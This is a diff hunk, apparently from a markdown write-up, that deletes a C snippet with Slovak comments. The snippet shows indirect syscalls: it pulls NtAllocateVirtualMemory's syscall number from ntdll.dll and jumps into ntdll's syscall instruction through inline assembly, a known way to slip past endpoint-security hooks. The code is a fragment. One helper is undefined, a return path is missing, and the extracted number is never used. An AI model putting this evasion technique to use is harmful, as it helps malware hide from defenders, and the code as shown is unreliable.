@@ -1385,32 +1385,3 @@ for i in range(0, len(res), 6):
 print(out)
 ```
 
-```c title=indirect.c
-typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(
-    HANDLE ProcessHandle,
-    PVOID* BaseAddress,
-    ULONG_PTR ZeroBits,
-    PSIZE_T RegionSize,
-    ULONG AllocationType,
-    ULONG Protect
-);
-
-DWORD GetSyscallNumber() {
-    HMODULE ntdll = GetModuleHandle(L"ntdll.dll");
-    BYTE* func = (BYTE*)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
-    
-    if (func[0] == 0x4C && func[1] == 0x8B && func[2] == 0xD1) {
-        return *(DWORD*)(func + 4);  // dynamicke extrahovanie SNN z ntdll.dll
-    }
-}
-
-PVOID syscall_addr = FindSyscallInstruction(); // nájdi syscall inštrukciu
-
-__declspec(naked) NTSTATUS IndirectNtAllocateVirtualMemory() {
-    asm {
-        mov r10, rcx
-        mov eax, SYSCALL_NUM  // naše získané SSN
-        jmp qword ptr [syscall_addr]  // skáčeme do ntdll.dll
-    }
-}
-```
